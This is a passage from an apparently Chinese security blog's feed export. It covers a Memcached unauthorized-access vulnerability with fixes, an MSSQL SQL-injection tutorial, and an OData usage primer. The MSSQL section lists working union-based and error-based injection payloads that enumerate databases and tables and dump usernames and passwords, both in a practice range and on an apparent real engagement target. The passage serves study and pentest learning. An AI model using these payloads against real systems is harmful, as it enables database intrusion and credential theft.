<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;afctf&#123;OPT_1s_Int3rest1ng&#125;!&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>-CTF -Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Memcached 未授权访问漏洞</title>
    <url>/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Memcached-未授权访问漏洞CVE-2013-7239"><a href="#Memcached-未授权访问漏洞CVE-2013-7239" class="headerlink" title="Memcached 未授权访问漏洞CVE-2013-7239"></a><strong>Memcached 未授权访问漏洞CVE-2013-7239</strong></h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key - Value<br>的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于<br>Memcached 的安全设计缺陷客户端连接 Memcached<br>服务器后无需认证就可读取、修改服务器缓存内容。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号CVE-2013-7239 。</p>
<p>(4) 影响范围Memcached 全版本。</p>
<h2 id="安装-Memcached"><a href="#安装-Memcached" class="headerlink" title="安装 Memcached"></a>安装 Memcached</h2><p>Linux系统安装memcached，首先要先安装libevent库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libevent ibevent-dev     </span><br><span class="line">自动下载安装（Ubuntu/Debian）</span><br><span class="line"></span><br><span class="line">yum install libevent libevent-devel</span><br><span class="line">自动下载安装（Redhat/Fedora/Centos）</span><br></pre></td></tr></table></figure>



<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p><strong>Ubuntu&#x2F;Debian</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install memcached</span><br></pre></td></tr></table></figure>

<p><strong>Redhat&#x2F;Fedora&#x2F;Centos</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>

<p><strong>FreeBSD</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portmaster databases/memcached</span><br></pre></td></tr></table></figure>



<p>安装完后可以使用 whereis 查看命令的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis memcached</span><br></pre></td></tr></table></figure>



<p>安装完成后，启动Mecached</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: /usr/bin/memcached  -u root -p 11211 -m 64m -vv</span><br></pre></td></tr></table></figure>

<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/77972532663466b685d87df4f73addb5.png" class>



<p>使用netstat -an | more查看端口监听情况，回显0.0.0.0:<strong>11211</strong>表示在所有网卡进行监听</p>
<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1b48f94a16e35db707079e0508b68384.png" class>



<p>使用telnet连接11211端口，没有使用账号密码登录登陆成功</p>
<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8888a9b284940445c4e06401f7c9219b.png" class>



<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1)配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或<br>Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp  -s  xxx.xxx.xxx.xxx  --dport  11211  -j ACCEPT</span><br></pre></td></tr></table></figure>



<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached<br>启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>



<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>



<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>



<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>未授权访问</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -未授权访问 -Memcached</tag>
      </tags>
  </entry>
  <entry>
    <title>MSSQL注入学习</title>
    <url>/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="MSSQL注入学习"><a href="#MSSQL注入学习" class="headerlink" title="MSSQL注入学习"></a>MSSQL注入学习</h1><p>对于SQL注入来说，之前只在项目中接触过MYSQL和Postgresql注入，这次记录下前辈在某系统后台挖掘的MSSQL注入。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MSSQL，指的是MSSQL是指微软的SQL Server数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属<a href="https://cloud.tencent.com/product/cdb-overview?from=10680">关系型数据库</a></p>
<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>​        MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路。</p>
<p>对于MSSQL注入需要注意的是:</p>
<ul>
<li>注入点的注入类型,是字符型还是数字型</li>
<li>注入点的权限问题,是<code>sa</code>、<code>db_owner</code>还是<code>public</code>.对与<code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-users）</li>
<li>注入点是否报错显示，对于字符型报错点是否可以使用注释语句</li>
</ul>
<p>​    </p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul>
<li><p>MSSQL自带库–&gt;master数据库</p>
</li>
<li><p>每个库都有一个系统自带表–&gt;sysobjects</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该系统表值得记住的字段:NAME字段 XTYPE字段  ID字段</span><br><span class="line">Name:表名信息</span><br><span class="line">Xtype:代表表达类型。S参数代表系统自带表，U参数代表用户创建的表 </span><br><span class="line">Id:用来连接syscolumns表</span><br></pre></td></tr></table></figure>
</li>
<li><p>top关键字限制输出数据.与MYSQL中的limit关键字相同用来限制输出数据条数，如输出一条数据 (top 1)，输出第二条数据(top 1+).</p>
</li>
<li><p>注释符号为–</p>
</li>
</ul>
<h3 id="常用参数函数"><a href="#常用参数函数" class="headerlink" title="常用参数函数"></a>常用参数函数</h3><ul>
<li>@@version:当前数据库 版本</li>
<li>@@servername:当前运行服务器 名称</li>
<li>db_name:当前数据库名称</li>
<li>user:当前 数据库执行 用户</li>
<li>IS_SERVRoLEMEMBER():查询数据库权限。常用权限sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin,证明为相应权限返回1.</li>
</ul>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>联合查询使用union进行连接查询语句</p>
<ul>
<li>判断注入点后，使用order by获取查询字段数 </li>
<li>使用union后面连接查询语句</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxx union select null,null,null,null,(查询语句)  from   xxxx   where   xxx=xxx</span><br></pre></td></tr></table></figure>



<h3 id="报错查询"><a href="#报错查询" class="headerlink" title="报错查询"></a>报错查询</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字型:and 1=(select @@version)</span><br><span class="line">字符型:‘ and 1=(select @@version)--</span><br></pre></td></tr></table></figure>

<p>由于括号里面的查询结果为字符类型，而前面的1为整型。系统会将字符类型转换为整型，肯定与前面的数字1不相等，所以报错。在转换为整数型之前会将查询语句进行查询。</p>
<h3 id="步骤-x2F-思路"><a href="#步骤-x2F-思路" class="headerlink" title="步骤&#x2F;思路"></a>步骤&#x2F;思路</h3><ul>
<li><p>首先判断注入点字段位置，注入点类型为字符型还是数字型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字型: and 1=1--  and 1=2--</span><br><span class="line">字符型: ‘ and  1=1--  ’ and 1=2--</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断注入点查询注入方式:联合查询 、报错查询、布尔&#x2F;时间盲注</p>
<p>若使用order by查询出该查询语句查询字段后，则可以尝试是否可以使用union联合查询(可能会过滤转义特殊字符)</p>
<p>若联合查询特殊字符被过滤并且目标系统存在报错回显信息，尝试报错查询注入</p>
<p>若前两者都不能，则尝试布尔&#x2F;时间盲注。通过一些mssql数据库中的函数比如exist(),substring()等获取</p>
</li>
<li><p>通过注入查询方式按照数据库基本信息(当前数据库名称，用户，运行服务器，执行权限)–&gt;数据表–&gt;数据列–&gt;敏感信息数据–&gt;写 shell木马文件–&gt;连接服务器，获取权限</p>
</li>
</ul>
<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a href="https://www.mozhe.cn/bug/detail/SXlYMWZhSm15QzM1OGpyV21BR1p2QT09bW96aGUmozhe">SQL手工注入漏洞测试(Sql Server数据库)<em>SQL注入_在线靶场_墨者学院</em></a></p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209101901336.png" class title="image-20211209101901336">



<p>靶场页面如下，显示一个管理系统登录页面</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209102146559.png" class title="image-20211209102146559">



<p>在尝试使用弱口令登录错误后，缓过来这个注入不应该在登录中。看到下面有个通知，点进去看到通过id值来获取页面，可能存在注入点，下面进行探测</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103101249.png" class title="image-20211209103101249">



<p>通过两者构造不同判断出该id字段存在注入点</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103627865.png" class title="image-20211209103627865">

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103601097.png" class>



<p>该注入点为数字型注入，先判断查询字段数进行查询(使用order by x)</p>
<p>当字段为5时显示错误，则查询字段为4</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209104844041.png" class title="image-20211209104844041">



<p>我们判断可以使用联合注入进行查询，下面判断回显字段，返回第二个和第三个字段并且为字符型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-2%20union%20all%20select%20null,%272%27,%273%27,4</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209105701949.png" class title="image-20211209105701949">

<p>确定回显字段后，在对应字段输入查询信息进行查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-2%20union%20all%20select%20null,(@@version),(@@servername),4</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209110027614.png" class title="image-20211209110027614">



<p>查询数据库名称和当前用户</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209110409888.png" class title="image-20211209110409888">





<p>爆数据库中数据表 </p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209112032551.png" class title="image-20211209112032551">

<p>查询数据表中的列.这里通过col_name()函数获取对应数据表的第几个列名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-2%20union%20all%20select%201,(select%20top%201%20col_name(object_id(%27manage%27),1)%20from%20sysobjects),%20%273%27,4</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209112946811.png" class title="image-20211209112946811">

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113059383.png" class title="image-20211209113059383">

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113121041.png" class title="image-20211209113121041">



<p>查询获得的username和password列后，接着就去获取该字段值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d=-2%20union%20all%20select%201,username,password,4%20from%20manage</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113324585.png" class title="image-20211209113324585">

<p>MD5解密获取明文密码</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113424120.png" class title="image-20211209113424120">



<p>登录系统成功，获取flag</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113522221.png" class title="image-20211209113522221">



<h2 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h2><p>下面对在项目中遇到的MSSQL注入进行记录学习。</p>
<p>修改content字段为单引号，此时服务器报错显示引号不完整。可以判断该注入点为字符型注入。</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140003887.png" class title="image-20211208140003887">



<p>使用报错注入查询数据库相关数据信息，如下:</p>
<h3 id="获取数据库版本"><a href="#获取数据库版本" class="headerlink" title="获取数据库版本"></a>获取数据库版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘%20and%201=(select%20@@version)--</span><br></pre></td></tr></table></figure>

<p>可以在报错信息中看到数据库版本</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140631370.png" class title="image-20211208140631370">



<h3 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘%20and%201=(select%20db_name())--</span><br></pre></td></tr></table></figure>

<p>在报错信息中看到数据库名称</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140940039.png" class title="image-20211208140940039">



<h3 id="获取运行服务器名称"><a href="#获取运行服务器名称" class="headerlink" title="获取运行服务器名称"></a>获取运行服务器名称</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘%20and%201=(select%20@@servername)--</span><br></pre></td></tr></table></figure>

<p>在报错信息中看到服务器名称.</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208141524584.png" class title="image-20211208141524584">



<h3 id="获取用户数据库名称"><a href="#获取用户数据库名称" class="headerlink" title="获取用户数据库名称"></a>获取用户数据库名称</h3><h4 id="获取第一个用户数据库名称"><a href="#获取第一个用户数据库名称" class="headerlink" title="获取第一个用户数据库名称"></a>获取第一个用户数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘%20and%201=(select%20top%201%20name%20from%20master..sysdatabases%20where%20dbid&gt;4)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208142347154.png" class title="image-20211208142347154">



<h4 id="获取第二个用户数据库名称"><a href="#获取第二个用户数据库名称" class="headerlink" title="获取第二个用户数据库名称"></a>获取第二个用户数据库名称</h4><p>当获取第一个用户数据库后，接着利用第一个用户数据名称来获取其他用户数据库名称</p>
<p>查询方式1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20master..sysdatabases%20where%20dbid&gt;4%20and%20name!=&#x27;ReportServer&#x27;)--</span><br></pre></td></tr></table></figure>

<p>查询方式2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20master..sysdatabases%20where%20dbid&gt;5)--</span><br></pre></td></tr></table></figure>



<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208142956055.png" class title="image-20211208142956055">

<p>可以按照这样的方法来一个一个获取用户数据库名称</p>
<h4 id="获取所有数据库名称"><a href="#获取所有数据库名称" class="headerlink" title="获取所有数据库名称"></a>获取所有数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20name%20from%20master..sysdatabases%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>

<p>将查询结果以xml形式展示</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208143508464.png" class title="image-20211208143508464">



<h3 id="获取数据库表名"><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h3><h4 id="获取用户表名"><a href="#获取用户表名" class="headerlink" title="获取用户表名"></a>获取用户表名</h4><p>通过sysobjects数据表来查询用户创建的数据表</p>
<p>查询第一个数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20sysobjects%20where%20xtype=&#x27;u&#x27;)--</span><br></pre></td></tr></table></figure>



<p>我们也可以使用SQL注入中的常用的information_schema数据库进行查询 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20table_name%20from%20information_schema.tables)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208144010998.png" class title="image-20211208144010998">



<p>查询第二个数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20sysobjects%20where%20xtype=&#x27;u&#x27;%20and%20name!=&#x27;UsersInfoB&#x27;)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208145218103.png" class title="image-20211208145218103">

<p>和上面逐一获取数据库一样，照着此法获取数据表名。</p>
<h4 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h4><p>将查询结果以xml文件一起输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20name%20from%20sysobjects%20where%20xtype=&#x27;u&#x27;%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208144538119.png" class title="image-20211208144538119">



<h3 id="获取数据库列名"><a href="#获取数据库列名" class="headerlink" title="获取数据库列名"></a>获取数据库列名</h3><h4 id="获取列名称"><a href="#获取列名称" class="headerlink" title="获取列名称"></a>获取列名称</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20syscolumns%20where%20id=(select%20id%20from%20sysobjects%20where%20name=&#x27;UsersInfoB&#x27;))--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208153340533.png" class title="image-20211208153340533">

<p>以此来依次获取列名，同上。</p>
<h4 id="获取所有列名"><a href="#获取所有列名" class="headerlink" title="获取所有列名"></a>获取所有列名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20%20name%20from%20syscolumns%20where%20id=(select%20id%20from%20sysobjects%20where%20name=&#x27;UsersInfoB&#x27;)%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208153316387.png" class title="image-20211208153316387">



<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>这里以UsersInfo数据表来获取相应字段数据</p>
<p>查询用户名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20Username%20from%20UsersInfoB%20where%20id=1)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208155305278.png" class title="image-20211208155305278">



<p>查询密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20Userpass%20from%20UsersInfoB%20where%20id=1)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208155402794.png" class title="image-20211208155402794">

]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>SQL注入</category>
        <category>MSSQL注入</category>
      </categories>
      <tags>
        <tag>-web漏洞 -SQL注入 -MSSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>ODATA用法小记</title>
    <url>/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h1 id="ODATA用法小记"><a href="#ODATA用法小记" class="headerlink" title="ODATA用法小记"></a>ODATA用法小记</h1><hr>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
<p>开放数据协议（Open Data Protocol，简称OData）是一种描述如何创建和访问<a href="https://baike.baidu.com/item/Restful">Restful</a>服务的<a href="https://baike.baidu.com/item/OASIS/4235159">OASIS</a>标准。该标准由<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF/124767">微软</a>发起 ,前三个版本1.0、2.0、3.0都是微软开放标准，遵循微软开放规范承诺书（Microsoft Open Specification Promise).第四个版本4.0于2014年3月17日在<a href="https://baike.baidu.com/item/OASIS/4235159">OASIS</a>投票通过成为开放工业标准 .</p>
<p>对于使用OData的开发人员而言，可以将OData服务简化理解为一个<strong>URI(Uniform Resource Identifier)统一资源标识符</strong>，它是一种满足RESTful设计风格的Web服务有关OData的的协议的详细介绍，可以访问<a href="http://www.odata.org/">www.odata.org</a></p>
<h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><hr>
<p>ODATA由“格式”和“协议”这两部分组成。格式定义了如何描述数据，协议定义了如何操作数据，所以我们可以及那个ODATA理解为接口协议，因为它规定了数据格式和数据操作标准。</p>
<h3 id="通用格式定义语言-CSDL"><a href="#通用格式定义语言-CSDL" class="headerlink" title="通用格式定义语言(CSDL)"></a>通用格式定义语言(CSDL)</h3><p>OData服务的数据模型是通过<a href="https://baike.baidu.com/item/EDM/3131413">EDM</a>（实体数据模型）来定义的。通用格式定义语言（Common Schema Definition Language (CSDL)）定义了OData服务的<a href="https://baike.baidu.com/item/EDM/3131413">EDM</a>模型的一种XML格式的表现形式。</p>
<p>它的内容包括：</p>
<ul>
<li>CSDL的命名空间</li>
<li>实体模型的<a href="https://baike.baidu.com/item/%E5%B0%81%E8%A3%85/2796965">封装</a></li>
<li>实体模型的普通特性</li>
<li>具体的XML元素和属性介绍</li>
</ul>
<h3 id="核心协议及URL规范"><a href="#核心协议及URL规范" class="headerlink" title="核心协议及URL规范"></a>核心协议及URL规范</h3><p>核心协议主要定义了开放数据协议的核心语义和行为。它们包括：</p>
<ul>
<li>数据模型</li>
<li>服务模型</li>
<li>协议和模型的版本管理</li>
<li>拓展性</li>
<li>数据格式</li>
<li><a href="https://baike.baidu.com/item/HTTP">HTTP</a>头</li>
<li><a href="https://baike.baidu.com/item/HTTP">HTTP</a>状态码</li>
<li>上下文URL（context URL）</li>
<li>数据请求和响应</li>
<li>安全性</li>
<li>一致性（Conformance）</li>
</ul>
<p>URL规范主要定义了一系列推荐（非强制）采用的构建用于访问OData服务中的数据和模型的URL的规则。它们包括：</p>
<ul>
<li>URL的组成部分</li>
<li>服务的根URL</li>
<li>资源路径</li>
<li>查询语句</li>
</ul>
<p>URL的形式如下:</p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116103541596.png" class title="image-20211116103541596">



<p>可以知道，通过OData这种方式，我们可以<strong>将一个数据源、服务发布成一个public的URI</strong>，因此对于服务的使用者（Consumer）而言, 其并不需要关系OData背后的具体开发语言或技术，其只需要满足HTTP通信协议即可。</p>
<h3 id="服务结构"><a href="#服务结构" class="headerlink" title="服务结构"></a>服务结构</h3><p>OData的服务结构包括：</p>
<p>1）服务文档（Service Document）：描述了OData Service中可用的数据的概览信息,也即OData中所含的Entity Set信息。</p>
<p>2）服务元结构文档（Service Metadata Document）：在元结构文档中，描述了OData服务中的数据类型及其相关的属性，也即Entity Type和Property。</p>
<p>在以上两种文档中包含了：</p>
<ol>
<li><p>实体集合（Entity Set）：等同于RSS中的Feed节点，是某一种信息的集合</p>
</li>
<li><p>实体（Entity）：等同于RSS中的Entry节点，描述了具体某一条目信息的内容</p>
</li>
</ol>
<ol start="3">
<li><p>实体类型（Entity Type）：表明实体的类型，每一个实体都对应一个Entity Type</p>
</li>
<li><p>属性（Property）: 实体具体的属性</p>
</li>
<li><p>导航属性（Navigation Property）：用于描述层级关系，例如Category - Sub-category这种关系</p>
</li>
<li><p>关联（Association）：描述关联关系</p>
</li>
</ol>
<p>示例访问ODATA文件:</p>
<p># 访问OData的Service Document：</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/">https://services.odata.org/V3/Northwind/Northwind.svc/</a></p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116105053919.png" class title="image-20211116105053919">

<p>在OData的service document中可以看到所有的Entity Set</p>
<p>#访问ODATA的Medata Document:</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/$metadata">https://services.odata.org/V3/Northwind/Northwind.svc/$metadata</a></p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116105523325.png" class title="image-20211116105523325">

<p>在OData的metadata document中可找到Entity Type和Property</p>
<p># 访问OData中具体的某一个Entity Set实体集合：</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/Products">https://services.odata.org/V3/Northwind/Northwind.svc/Products</a></p>
<p>Products为实体集合名称，前面的为网站根目录</p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116105622393.png" class title="image-20211116105622393">



<p># 访问OData中具体的某一个Entiry实体:</p>
<p> <a href="https://services.odata.org/V3/Northwind/Northwind.svc/Product(1)">https://services.odata.org/V3/Northwind/Northwind.svc/Product(1)</a></p>
<p>OData采用圆括号作为表示单独实体的键值的字段（key segment）</p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116112103418.png" class title="image-20211116112103418">



<p># 访问OData服务中，某一Entity实体的属性：</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/Product(1)/productID">https://services.odata.org/V3/Northwind/Northwind.svc/Product(1)/productID</a></p>
<p>product(1)为实体，productID为 实体中的某一属性</p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116112135292.png" class title="image-20211116112135292">

<p>如果想查看某一具体的实体，则直接在OData Service Document的URL后直接append上具体的实体名称即可，例如上例中的实体集合Customers；在实体集合中，每一条entry也即对应着一条数据的Entity。</p>
<p>#访问Odata服务中，某一属性的原始值:</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/product(1)/productID/$value">https://services.odata.org/V3/Northwind/Northwind.svc/product(1)/productID/$value</a></p>
<h2 id="ODATA常用操作"><a href="#ODATA常用操作" class="headerlink" title="ODATA常用操作"></a>ODATA常用操作</h2><p>下表列举了一些常用的Odata操作:</p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116112457200.png" class title="image-20211116112457200">



<h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><h4 id="选择查询-select"><a href="#选择查询-select" class="headerlink" title="选择查询($select)"></a>选择查询($select)</h4><p>$select用于选择实体的哪些属性被包含在返回的数据中。</p>
